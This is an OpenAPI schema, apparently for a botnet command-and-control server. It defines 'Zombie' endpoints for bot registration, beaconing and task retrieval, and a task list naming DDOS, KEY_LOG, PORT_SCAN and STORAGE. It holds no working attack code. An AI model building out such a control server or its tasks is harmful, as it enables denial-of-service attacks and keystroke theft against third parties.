# swagger.json
{
  "openapi": "3.0.1",
  "info": {
    "title": "C2, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null",
    "version": "1.0"
  },
  "paths": {
...
    "/Zombie/Register": {
      "post": {
        "tags": [
          "Zombie"
        ],
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "$ref": "#/components/schemas/InitialParameters"
              }
            },
            "text/json": {
              "schema": {
                "$ref": "#/components/schemas/InitialParameters"
              }
            },
            "application/*+json": {
              "schema": {
                "$ref": "#/components/schemas/InitialParameters"
              }
            }
          }
        },
        "responses": {
          "200": {
            "description": "Success",
            "content": {
              "text/plain": {
                "schema": {
                  "$ref": "#/components/schemas/InitialResponse"
                }
              },
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/InitialResponse"
                }
              },
              "text/json": {
                "schema": {
                  "$ref": "#/components/schemas/InitialResponse"
                }
              }
            }
          }
        }
      }
    },
    "/Zombie/Beacon": {
      "get": {
        "tags": [
          "Zombie"
        ],
        "parameters": [
          {
            "name": "bot_id",
            "in": "query",
            "style": "form",
            "schema": {
              "type": "integer",
              "format": "int32"
            }
          },
          {
            "name": "task_id",
            "in": "query",
            "style": "form",
            "schema": {
              "type": "integer",
              "format": "int32"
            }
          },
          {
            "name": "progress",
            "in": "query",
            "style": "form",
            "schema": {
              "$ref": "#/components/schemas/ProgressEnum"
            }
          }
        ],
        "responses": {
          "200": {
            "description": "Success",
            "content": {
              "text/plain": {
                "schema": {
                  "$ref": "#/components/schemas/ActionEnum"
                }
              },
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/ActionEnum"
                }
              },
              "text/json": {
                "schema": {
                  "$ref": "#/components/schemas/ActionEnum"
                }
              }
            }
          }
        }
      }
    },
    "/Zombie/Request": {
      "get": {
        "tags": [
          "Zombie"
        ],
        "parameters": [
          {
            "name": "bot_id",
            "in": "query",
            "style": "form",
            "schema": {
              "type": "integer",
              "format": "int32"
            }
          }
        ],
        "responses": {
          "200": {
            "description": "Success",
            "content": {
              "text/plain": {
                "schema": {
                  "$ref": "#/components/schemas/BotTask"
                }
              },
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/BotTask"
                }
              },
              "text/json": {
                "schema": {
                  "$ref": "#/components/schemas/BotTask"
                }
              }
            }
          },
          "204": {
            "description": "No Content"
          }
        }
      }
    }
  },
  "components": {
    "schemas": {
      "ActionEnum": {
        "enum": [
          "REQUEST",
          "CONTINUE",
          "STOP"
        ],
        "type": "string"
      },
...
      "BotTask": {
        "type": "object",
        "properties": {
          "id": {
            "type": "integer",
            "format": "int32"
          },
          "task": {
            "$ref": "#/components/schemas/TaskEnum"
          },
          "taskParameters": {
            "type": "object",
            "additionalProperties": { },
            "nullable": true
          }
        },
        "additionalProperties": false
      },
      "InitialParameters": {
        "type": "object",
        "properties": {
          "cpu": {
            "type": "string",
            "nullable": true
          },
          "ram": {
            "type": "integer",
            "format": "int32"
          },
          "ip": {
            "type": "string",
            "nullable": true
          }
        },
        "additionalProperties": false
      },
      "InitialResponse": {
        "type": "object",
        "properties": {
          "name": {
            "type": "string",
            "nullable": true
          },
          "id": {
            "type": "integer",
            "format": "int32"
          }
        },
        "additionalProperties": false
      },
      "ProgressEnum": {
        "enum": [
          "SUCCESS",
          "FAILURE",
          "WORKING"
        ],
        "type": "string"
      },
      "TaskEnum": {
        "enum": [
          "DDOS",
          "KEY_LOG",
          "PORT_SCAN",
          "QUACK",
          "STORAGE"
        ],
        "type": "string"
      }
    }
  }
}